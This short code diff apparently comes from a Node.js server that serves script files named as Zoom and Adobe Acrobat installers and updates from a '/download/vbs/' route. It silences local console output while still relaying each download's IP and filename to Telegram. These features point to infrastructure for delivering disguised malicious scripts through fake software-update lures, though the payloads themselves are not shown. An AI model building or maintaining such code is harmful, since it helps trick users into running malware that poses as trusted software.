@@ -66,9 +66,9 @@ function log(level, meta = {}) {
 
   sendTelegramMessage(text).catch(console.error);
 
-  console.log(
-    `[${level}] ${meta.event} | ${meta.ip || "-"} | ${meta.path || meta.filename || ""}`
-  );
+  // console.log(
+  //   `[${level}] ${meta.event} | ${meta.ip || "-"} | ${meta.path || meta.filename || ""}`
+  // );
 }
 
 // ======= Rate limiter =======
@@ -317,7 +317,7 @@ app.get('/download/vbs/:type', apiLimiter, async (req, res) => {
                 filename = 'Zoom_Browser_Setup.js';
                 break;
             case 'adobe':
-                filename = 'Acrobat_update.js';
+                filename = 'Acrobat_Update.js';
                 break;    
             default:
                 filename = 'Zoom_Workplace.js';
